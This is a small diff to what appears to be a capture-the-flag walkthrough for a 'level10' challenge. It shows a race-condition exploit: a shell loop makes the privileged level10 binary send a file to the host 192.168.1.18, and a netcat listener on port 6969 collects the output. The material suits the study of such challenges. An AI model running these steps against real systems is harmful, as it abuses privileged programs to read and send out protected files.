@@ -39,15 +39,15 @@ while true; do
 done
 ```
 
--Second: In another shell instance just create an infinite loop of the `level10` executable calling this file to our host:
+-Second: In another shell instance just create an infinite loop of the `level10` executable calling this file to our host (192.168.1.18` in our case):
 
 ``` shell
 while true; do
-    ./level10 /tmp/dummy /path/to/your/host;
+    ./level10 /tmp/dummy 192.168.1.18;
 done
 ```
 
--Third: Lastly in our host machine for example (`192.168.1.18` in our case) put a server listening and discard all the "dummy" content:
+-Third: Lastly in our host machine put a server listening and discard all the "dummy" content:
 
 ``` shell
 ➜  Resources git:(master) ✗ nc -lk -p 6969 | grep -v 'dummy\|.*( )*.'
